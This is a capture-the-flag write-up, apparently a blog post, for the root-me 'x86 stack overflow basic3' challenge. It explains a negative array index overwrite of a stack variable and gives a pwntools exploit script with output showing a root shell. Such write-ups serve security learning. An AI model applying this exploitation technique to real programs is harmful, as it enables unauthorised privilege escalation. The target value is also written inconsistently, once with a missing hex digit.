@@ -1,0 +1,59 @@
+---
+layout: post
+status: publish
+published: true
+title: root-me:x86 stack overflow basic3
+author:
+  display_name: SpeakSoftlyLove
+  login: root
+  email: foxwest@qq.com
+  url: ''
+author_login: root
+author_email: foxwest@qq.com
+wordpress_id: 302
+wordpress_url: http://403forbidden.website/?p=302
+date: '2017-11-29 15:39:48 +0800'
+date_gmt: '2017-11-29 07:39:48 +0800'
+categories:
+- root-me
+tags:
+- root-me
+comments: []
+---
+<h1>x86 stack overflow basic3</h1>
+<h2>general</h2>
+<p>from the code source we found:<br />
+* we could control the index of array <code>buffer</code> to be a negative value,an important feature of array is that we could read or write the content near the base address of an array.<br />
+* send <code>0x08</code> to make index value <code>count</code> point to right area(<code>check</code>),then send <code>0xbfffabc</code></p>
+<h2>step</h2>
+<p>locate the <code>check</code> position:</p>
+<pre><code class="c">char buffer[64];
+int check;
+int i = 0;
+int count = 0;
+</code></pre>
+<p>so its stack layout is:</p>
+<pre><code class="c">buffer array           //buffer[8]
+buffer array           //buffer[4]
+buffer base address   //buffer[0]
+check                 //buffer[-4]
+i
+count                 //low address
+</code></pre>
+<p>send four bytes <code>\x08</code> make <code>count</code> be <code>-4</code><br />
+send little endian <code>0xbfffabc</code></p>
+<h2>exploit</h2>
+<pre><code class="python">from pwn import *
+p = process('./ch16')
+p.recvuntil(':')
+p.sendline('\x08'*4 + '\xbc\xfa\xff\xbf')
+p.interactive()
+</code></pre>
+<p>run it:</p>
+<pre><code class="bash"> ⚡ root@pwn  /mnt/hgfs/pwnexc/root-me/x86 bof b3  python exp_ch16.py
+[+] Starting local process './ch16': pid 3873
+[*] Switching to interactive mode
+ $ id
+uid=0(root) gid=0(root) 组=0(root)
+ $ 
+</code></pre>
